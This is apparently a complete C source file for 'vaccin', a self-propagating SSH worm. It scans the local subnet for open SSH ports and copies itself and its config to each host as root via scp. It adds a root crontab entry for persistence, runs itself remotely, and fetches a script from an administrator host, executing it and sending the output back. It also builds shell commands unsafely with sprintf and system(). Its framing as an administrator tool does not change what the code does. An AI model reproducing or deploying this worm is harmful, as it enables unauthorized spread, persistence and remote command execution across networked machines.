#include "../include/vaccin.h"

bool isRoot()
{
	bool ret = false;
	
	// check if the uid and euid are equals to 0
	if (getuid() == 0 && geteuid() == 0) {
		syslogMsg("## Launching vaccin by root");
		ret = true;
	}

	return ret;
}

bool isSourceHost()
{
	bool ret = false;
	char buf[IP_LEN];
	char *ip_admin;
	struct ifaddrs *myaddrs, *ifa;
	struct sockaddr_in *s4;

	// get the administrator ip address
	ip_admin = iniparser_getstring(params, "Administrator:ip", NULL);

	// get all network interfaces available
	if (getifaddrs(&myaddrs) != 0)
		return ret;

	// for each network interface
	for (ifa = myaddrs; ifa != NULL; ifa = ifa->ifa_next) {
		// if the interface uses TCP/IP
		if (ifa->ifa_addr->sa_family == AF_INET) {
			s4 = (struct sockaddr_in *) (ifa->ifa_addr);
			// if the interface has an ip address defined
			if (inet_ntop(ifa->ifa_addr->sa_family, (void *) &(s4->sin_addr), buf, sizeof(buf)) != NULL) {
				// if the ip address of the interface and the admin ip address are identical
				if (!strcmp(ip_admin, buf)) {
					ret = true;
					syslogMsg("## We are the administrator's host");
					break;
				}
				memset(buf, 0, sizeof(buf));
			}
		}
	}
	free(myaddrs);

	return ret;
}

struct in_addr* scanNetwork()
{
	int ssh_port, sock, compteur = 0;
	unsigned long int nbrComputer, hostMask, i;
	char nbrComputer_[80];
	struct sockaddr_in sockHostIP;
	char *msg, *ip_admin, *mask_admin, *broadcast_addr;
	struct in_addr mask, broadcast, hostIP, sourceIP, *resultIP = NULL;

	syslogMsg("## Launching network scan");

	// get the administrator ip address
	ip_admin = iniparser_getstring(params, "Administrator:ip", NULL);

	// get the administrator ip address
	broadcast_addr = iniparser_getstring(params, "Network:broadcast", NULL);

	// get the ssh port
	ssh_port = iniparser_getint(params, "Network:portSSH", -1);

	// get the administrator mask address
	mask_admin =  getNetworkMask(ip_admin);
	if (mask_admin == NULL)
		return NULL;

	// convert the admin ip address in the Internet dot notation
	inet_aton(ip_admin, &sourceIP);

	// convert the admin network mask address in the Internet dot notation
	inet_aton(mask_admin, &mask);

	// convert the broadcast address in the Internet dot notation
	inet_aton(broadcast_addr, &broadcast);

	// get the number of hosts available
	nbrComputer = ntohl(broadcast.s_addr ^ mask.s_addr);
	hostMask = sourceIP.s_addr & mask.s_addr;

	sprintf(nbrComputer_, "%lu", nbrComputer);
	msg = (char *) malloc(sizeof("## Maximal number of hosts on this network : ") + strlen(nbrComputer_) + 1);
	if (msg != NULL) {
		strcpy(msg, "## Maximal number of hosts on this network : ");
		strcat(msg, nbrComputer_);
		syslogMsg(msg);
		free(msg);
	}

	// for each ip address on the network
	for (i = 1; i < nbrComputer; i++) {
		// get the target ip address
		hostIP.s_addr = htonl(ntohl(hostMask) + i);
		// if the target ip address and the admin ip address are identical
		if (!strcmp(inet_ntoa(hostIP), ip_admin)) {
			msg = (char *) malloc(sizeof("## Host administrator found : ") + strlen(ip_admin) + 1);
			if (msg != NULL) {
				strcpy(msg, "## Host administrator found : ");
				strcat(msg, ip_admin);
				syslogMsg(msg);
				free(msg);
			}
			continue;
		}

		// try to connect on the port tcp/22 of the target
		bzero(&sockHostIP, sizeof(sockHostIP));
		sock = socket(AF_INET, SOCK_STREAM, 0);
		sockHostIP.sin_family = AF_INET;
		sockHostIP.sin_port = htons(ssh_port);
		sockHostIP.sin_addr = hostIP;

		// if the port 22 is open
		if (connect(sock, (struct sockaddr *) & sockHostIP, sizeof(sockHostIP)) == 0) {
			// add the ip address in the list of available ssh servers
			resultIP = (struct in_addr *) realloc(resultIP, (compteur + 1) * sizeof(struct in_addr));
			resultIP[compteur] = hostIP;
			compteur++;

			msg = (char *) malloc(strlen(inet_ntoa(sockHostIP.sin_addr)) + \
						sizeof(" tested and ssh port is open") + 4);
			if (msg != NULL) {
				strcpy(msg, "## ");
				strcat(msg, inet_ntoa(sockHostIP.sin_addr));
				strcat(msg, " tested and ssh port is open");
				syslogMsg(msg);
				free(msg);
			}
		}
		else { // the port 22 is close
			// syslog message
			msg = (char *) malloc(strlen(inet_ntoa(sockHostIP.sin_addr)) + sizeof(" tested") + 4);
			if (msg != NULL) {
				strcpy(msg, "## ");
				strcat(msg, inet_ntoa(sockHostIP.sin_addr));
				strcat(msg, " tested");
				syslogMsg(msg);
				free(msg);
			}
			continue;
		}
	}

	return resultIP;
}

bool isAlreadyColonized(char *target_ip, char *worm_name)
{
	bool ret = false;
	int ssh_port;
	char command[4096];
	char *ssh_path, *target_dir, *target_worm_path;
	
	// get the target worm directory
	target_dir = iniparser_getstring(params, "Target:targetPath", NULL);

	// get the target worm path
	target_worm_path = (char *) malloc(strlen(target_dir) + strlen(worm_name) + 1);
	if (target_worm_path == NULL)
		return ret;
	strcpy(target_worm_path, target_dir);
	strcat(target_worm_path, worm_name);

	// get the ssh program path
	ssh_path = iniparser_getstring(params, "Network:ssh", NULL);

	// get the ssh port
	ssh_port = iniparser_getint(params, "Network:portSSH", -1);
	
	// test if the worm is present on the target host
	sprintf(command, "%s -p %d %s \"test -f %s\"", ssh_path, ssh_port, target_ip, target_worm_path);
	free(target_worm_path);
	if (system(command) == 0)
		ret = true;

	return ret;
}

bool colonize(char *target_ip, char *worm_name)
{
	bool ret = false;
	bool exec = false;
	int ssh_port;
	char *msg, *target_dir, *target_worm_path, *scp_path;

	msg = (char *) malloc(sizeof("## colonization of ") + strlen(target_ip) + 1);
	if (msg != NULL) {
		strcpy(msg, "## colonization of ");
		strcat(msg, target_ip);
		syslogMsg(msg);
		free(msg);
	}

	// get the worm directory on the target host
	target_dir = iniparser_getstring(params, "Target:targetPath", NULL);

	// get the worm path on the target host
	target_worm_path = (char *) malloc(strlen(target_dir) + strlen(basename(worm_name)) + 1);
	if (target_worm_path == NULL)
		return ret;
	strcpy(target_worm_path, target_dir);
	strcat(target_worm_path, worm_name);

	// copy the worm on the target host
	exec = uploadFile(worm_name, target_dir, target_ip);
	if (exec) {
		// copy the configuration file on the target host
		exec = uploadFile(CONFIG_FILE, target_dir, target_ip);
		if (exec) {
			msg = (char *) malloc(sizeof("## worm copy on %s") + strlen(target_ip) + 1);
			if (msg != NULL) {
				strcpy(msg, "## worm copy on ");
				strcat(msg, target_ip);
				syslogMsg(msg);
				free(msg);
			}
			// restore the root crontab on the target host
			exec = restoreTargetCrontab(target_ip, worm_name);
			if (exec) {
				// update the root crontab on the target host
				exec = updateTargetCrontab(target_ip, worm_name);
				if (exec) {
					msg = (char *) malloc(sizeof("## Automatic launch configuration for %s") \
								 + strlen(target_ip) + 1);
					if (msg != NULL) {
						strcpy(msg, "## Automatic launch configuration for ");
						strcat(msg, target_ip);
						syslogMsg(msg);
						free(msg);
					}
					// launch remote program
					exec = execRemote(target_ip, target_worm_path);
					if (exec) {
						msg = (char *) malloc(sizeof("## First worm execution on ") \
							+ strlen(target_ip) + 1);
						if (msg != NULL) {
							strcpy(msg, "## First worm execution on ");
							strcat(msg, target_ip);
							syslogMsg(msg);
							free(msg);
						}
						ret = true;
					}
				}
			}
		}
	}
	free(target_worm_path);

	return ret;
}

bool isAuthorized()
{
	bool ret = false;
	char *control;

	// get the control file who allows the worm to be executed
	control = iniparser_getstring(params, "Target:control", NULL);

	if (access(control, R_OK) == 0) {
		syslogMsg("## Vaccin is authorized on this host");
		ret = true;
	}
	else {
		syslogMsg("## Vaccin is not authorized on this host");
		ret = false;
	}

	return ret;
}

bool wormDelete(char *worm_name) 
{
	bool ret = false;
	bool exec = false;
	char *msg, *target_config, *target_dir, *target_worm_path;

	// get the worm directory
	target_dir = iniparser_getstring(params, "Target:targetPath", NULL);

	// get the worm path
	target_worm_path = (char *) malloc(strlen(target_dir) + strlen(basename(worm_name)) + 1);
	if (target_worm_path == NULL)
		return ret;
	strcpy(target_worm_path, target_dir);
	strcat(target_worm_path, worm_name);

	// get the configuration file
	target_config = (char *) malloc(strlen(target_dir) + strlen(CONFIG_FILE) + 1);
	if (target_config == NULL)
		return ret;
	strcpy(target_config, target_dir);
	strcat(target_config, CONFIG_FILE);

	// restore the root crontab
	exec = restoreCrontab(worm_name);
	if (exec) {
		syslogMsg("## Delete automatic launch configuration");
		// delete the program
		exec = deleteFile(target_worm_path);
		if (exec) {
			msg = (char *) malloc(sizeof("## Delete vaccin file : ") + strlen(target_worm_path) + 1);
			if (msg != NULL) {
				strcpy(msg, "## Delete vaccin file : ");
				strcat(msg, target_worm_path);
				syslogMsg(msg);
				free(msg);
			}
			// delete the configuration file
			exec = deleteFile(target_config);
			if (exec) {
				msg = (char *) malloc(sizeof("## Delete vaccin configuration file : ") \
							+ strlen(target_config));
				if (msg != NULL) {
					strcpy(msg, "## Delete vaccin configuration file : ");
					strcat(msg, target_config);
					syslogMsg(msg);
					free(msg);
				}
				ret = true;
				syslogMsg("## Successfully deletion of vaccin");
			}
		}
	}	
	free(target_worm_path);
	free(target_config);

	return ret;
}

bool infosRecovery()
{
	bool ret = false;
	bool exec = false;
	char *ip_admin, *target_script_path, *target_dir;
	char *admin_script, *control, *output, *output_dir;

	syslogMsg("## Information recovery");

	// get log filename
	output = getLogFilename();
	if (output == NULL)
		return ret;

	// get the administrator ip address
	ip_admin = iniparser_getstring(params, "Administrator:ip", NULL);

	// get the worm directory on the target host
	target_dir = iniparser_getstring(params, "Target:targetPath", NULL);

	// get the control file who allows the worm to be executed
	control = iniparser_getstring(params, "Target:control", NULL);

	// get the output dirname for the script
	output_dir = iniparser_getstring(params, "Administrator:output", NULL);

	// get the script name
	admin_script = iniparser_getstring(params, "Administrator:command", NULL);

	// get the script path on the target host
	target_script_path = (char *) malloc(strlen(target_dir) + strlen(basename(admin_script)) + 1);
	if (target_script_path == NULL)
		return ret;
	strcpy(target_script_path, target_dir);
	strcat(target_script_path, basename(admin_script));

	syslogMsg("## Batch file downloading");
	exec = downloadScript();
	if (exec) {
		syslogMsg("## Batch file execution");
		exec = executeScript();
		if (exec) {
			syslogMsg("## Batch file deletion");
			exec = deleteFile(target_script_path);
			if (exec) {
				syslogMsg("## Sending results");
				exec =  uploadFile(output, output_dir, ip_admin);
				if (exec) {
					syslogMsg("## Control file reseting");
					exec = deleteFile(control);
					if (exec) {
						exec = deleteFile(output);
						if (exec) {
							syslogMsg("## Successfully recovery informations");
							ret = true;
						}
					}
				}
			}
		}
	}
	free(target_script_path);
	free(output);

	return ret;
}

char* getNetworkMask(char *ip)
{
	char buf[IP_LEN];
	char *netMask = NULL;
	struct ifaddrs *myaddrs, *ifa;
	struct sockaddr_in *s4, *mask;

	// get all network interfaces available
	if (getifaddrs(&myaddrs) != 0)
		return NULL;

	// for each network interface
	for (ifa = myaddrs; ifa != NULL; ifa = ifa->ifa_next) {
		// if the interface uses TCP/IP
		if (ifa->ifa_addr->sa_family == AF_INET) {
			s4 = (struct sockaddr_in *) (ifa->ifa_addr);
			// if the interface has an ip address defined
			if (inet_ntop(ifa->ifa_addr->sa_family, (void *) &(s4->sin_addr), buf, \
			    sizeof(buf)) != NULL) {
				// if the ip address of the interface and the admin ip address are identical
				if (!strcmp(ip, buf)) {
					// get the network mask address
					mask = (struct sockaddr_in *) (ifa->ifa_netmask);
					inet_ntop(ifa->ifa_netmask->sa_family, \
						  (void *) &(mask->sin_addr),  buf, sizeof(buf));
					netMask = (char *) malloc(strlen(buf) + 1);
					if (netMask != NULL) {
						memset(netMask, 0, strlen(buf) + 1);
						strcpy(netMask, buf);
					}
					break;
				}
				memset(buf, 0, sizeof(buf));
			}
		}
	}
	free(myaddrs);

	return netMask;
}

bool uploadFile(char *srcFile, char *dstFile, char *ip)
{
	bool ret = false;
	int exec, ssh_port;
	char command[CMD_LEN];
	char *scp_path;

	// get the ssh program path
	scp_path = iniparser_getstring(params, "Network:scp", NULL);

	// get the ssh port
	ssh_port = iniparser_getint(params, "Network:portSSH", -1);

	// upload the file on the target host
	sprintf(command, "%s -P %d %s root@%s:%s", scp_path, ssh_port, srcFile, ip, dstFile);
	exec = system(command);
	if (exec == 0)
		ret = true;

	return ret;
}

bool restoreTargetCrontab(char *target_ip, char *worm_name)
{
	bool ret = false;
	int exec, ssh_port;
	char command[CMD_LEN];
	char *crontab, *ssh_path;

	// get the crontab path
	crontab = iniparser_getstring(params, "Target:crontab", NULL);

	// get the ssh program path
	ssh_path = iniparser_getstring(params, "Network:ssh", NULL);

	// get the ssh port
	ssh_port = iniparser_getint(params, "Network:portSSH", -1);

	// restore the root crontab on the target host
	sprintf(command, "%s -p %d root@%s \" if test -f %s ; then cat %s | grep -v %s > %s ; fi \"", \
		ssh_path, ssh_port, target_ip, crontab, crontab, worm_name, crontab);
	exec = system(command);
	if (exec == 0 || exec == 256)
		ret = true;

	return ret;
}

bool updateTargetCrontab(char *target_ip, char *worm_name)
{
	bool ret = false;
	int exec, ssh_port;
	char command[CMD_LEN];
	char *target_dir, *crontab, *ssh_path, *worm_path;

	// get the worm directory
	target_dir = iniparser_getstring(params, "Target:targetPath", NULL);

	// get the worm path
	worm_path = (char *) malloc(strlen(target_dir) + strlen(worm_name) + 1);
	if (worm_path == NULL)
		return ret;
	strcpy(worm_path, target_dir);
	strcat(worm_path, worm_name);

	// get the crontab path
	crontab = iniparser_getstring(params, "Target:crontab", NULL);

	// get the ssh program path
	ssh_path = iniparser_getstring(params, "Network:ssh", NULL);

	// get the ssh port
	ssh_port = iniparser_getint(params, "Network:portSSH", -1);

	// update the root crontab on the target host
	sprintf(command, "%s -p %d root@%s \" echo 0 \\* \\* \\* \\* %s >> %s \"", ssh_path, ssh_port, \
		target_ip, worm_path, crontab);
	exec = system(command);
	if (exec == 0)
		ret = true;

	return ret;
}

bool execRemote(char *target_ip, char *program)
{
	bool ret = false;
	int exec, ssh_port;
	char command[CMD_LEN];
	char *ssh_path;

	// get the ssh program path
	ssh_path = iniparser_getstring(params, "Network:ssh", NULL);

	// get the ssh port
	ssh_port = iniparser_getint(params, "Network:portSSH", -1);

	// execute a file on the target host
	sprintf(command, "%s -p %d root@%s \"%s\"", ssh_path, ssh_port, target_ip, program);
	exec = system(command);
	if (exec == 0)
		ret = true;

	return ret;
}

bool restoreCrontab(char *worm_name)
{
	bool ret = false;
	int exec;
	char command[CMD_LEN];
	char *crontab;

	// get the crontab path
	crontab = iniparser_getstring(params, "Target:crontab", NULL);

	// restore the local root crontab
	sprintf(command, "if test -f %s ; then cat %s | grep -v %s > %s ; fi", crontab, crontab, worm_name, crontab);
	exec = system(command);
	if (exec == 0 || exec == 256)
		ret = true;

	return ret;
}

bool deleteFile(char *file)
{
	bool ret = false;
	int exec;
	char command[CMD_LEN];

	// delete the file
	sprintf(command, "if test -f %s; then rm -f %s ; fi", file, file);
	exec = system(command);
	if (exec == 0)
		ret = true;

	return ret;
}

bool downloadScript()
{
	bool ret = false;
	int exec, ssh_port;
	char command[CMD_LEN];
	char *ip_admin, *scp_path, *script_path, *target_dir;

	// get the worm directory
	target_dir = iniparser_getstring(params, "Target:targetPath", NULL);

	// get the administrator ip address
	ip_admin = iniparser_getstring(params, "Administrator:ip", NULL);

	// get the script path
	script_path = iniparser_getstring(params, "Administrator:command", NULL);

	// get the scp program path
	scp_path = iniparser_getstring(params, "Network:scp", NULL);

	// get the ssh port
	ssh_port = iniparser_getint(params, "Network:portSSH", -1);

	// download the command file from the administrator host
	sprintf(command, "%s -P %d root@%s:%s %s", scp_path, ssh_port, ip_admin, script_path, target_dir);
	exec = system(command);
	if (exec == 0)
		ret = true;

	return ret;
}

bool executeScript()
{
	bool ret = false;
	int exec;
	char command[CMD_LEN];
	char *script_path, *output;
	
	// get the script path
	script_path = iniparser_getstring(params, "Administrator:command", NULL);

	// get log filename
	output = getLogFilename();
	if (output == NULL)
		return ret;

	sprintf(command, "date >> %s", output);
	exec = system(command);
	if (exec == 0) {
		sprintf(command, "%s >> %s", script_path, output);
		exec = system(command);
		if (exec == 0)
			ret = true;
	}
	free(output);

	return ret;
}

char* getLogFilename() 
{
	char hostname[1024];
	char *file;
	
	memset(hostname, 0, 1024);
	gethostname(hostname, 1023);

	file = (char *) malloc(strlen(hostname) + strlen(".txt") + 1);
	if (file == NULL)
		return  NULL;
	strcpy(file, hostname);
	strcat(file, ".txt");

	return file;
}
